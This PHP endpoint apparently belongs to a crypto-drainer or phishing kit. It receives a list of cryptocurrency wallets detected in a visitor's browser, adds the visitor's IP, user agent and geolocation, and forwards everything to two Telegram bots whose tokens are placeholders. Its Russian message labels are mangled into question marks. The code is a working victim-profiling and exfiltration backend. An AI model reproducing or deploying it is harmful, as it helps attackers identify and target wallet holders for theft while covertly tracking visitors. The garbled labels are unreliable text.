<?php
session_start();
if (!isset($_SESSION['user'])) {
    http_response_code(403);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

header('Content-Type: application/json');

// Redacted Telegram bot tokens for security
$botToken1 = 'YOUR_BOT_TOKEN_1';
$chatId1 = 'YOUR_CHAT_ID_1';
$botToken2 = 'YOUR_BOT_TOKEN_2';
$chatId2 = 'YOUR_CHAT_ID_2';

function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    if ($result === false) {
        file_put_contents('/tmp/telegram_error.log', "Failed to send to Telegram: " . print_r(error_get_last(), true) . "\n", FILE_APPEND);
    }
    return $result !== false;
}

$input = json_decode(file_get_contents('php://input'), true);
$detectedWallets = array_map('htmlspecialchars', $input['detectedWallets'] ?? []);
$platform = htmlspecialchars($input['platform'] ?? '??????????');

$ip = filter_var($_SERVER['REMOTE_ADDR'] ?? 'unknown', FILTER_VALIDATE_IP) ?: 'unknown';
$userAgent = htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'unknown');
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?lang=ru"));
$country = htmlspecialchars($geo->country ?? '??????????');
$city = htmlspecialchars($geo->city ?? '??????????');

$walletsList = !empty($detectedWallets) ? implode(", ", $detectedWallets) : '?? ??????????';

$message = "?? <b>????? ??????????!</b>\n"
         . "?? <b>IP:</b> <code>{$ip}</code>\n"
         . "?? <b>??????:</b> {$country}\n"
         . "?? <b>?????:</b> {$city}\n"
         . "?? <b>??????????:</b> {$userAgent}\n"
         . "?? <b>?????????:</b> {$platform}\n"
         . "?? <b>????????:</b> {$walletsList}";

$result1 = sendToTelegram($botToken1, $chatId1, $message);
$result2 = sendToTelegram($botToken2, $chatId2, $message);
file_put_contents('/tmp/telegram_debug.log', print_r([$result1, $result2], true) . "\n", FILE_APPEND);

echo json_encode(['status' => 'success']);
?>